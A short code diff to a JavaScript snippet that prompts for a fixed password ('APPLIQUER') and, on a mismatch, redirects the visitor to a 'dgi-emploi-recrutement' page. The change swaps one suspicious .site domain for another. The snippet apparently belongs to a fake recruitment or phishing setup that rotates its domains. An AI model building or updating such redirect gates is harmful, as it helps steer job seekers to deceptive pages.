@@ -4,5 +4,5 @@ password = prompt(
   'APPLIQUER'
 );
 if (password != 'APPLIQUER') {
-  location.href = 'https://www.zclogofitid.site/dgi-emploi-recrutement';
+  location.href = 'https://www.ashaofitid.site/dgi-emploi-recrutement';
 }
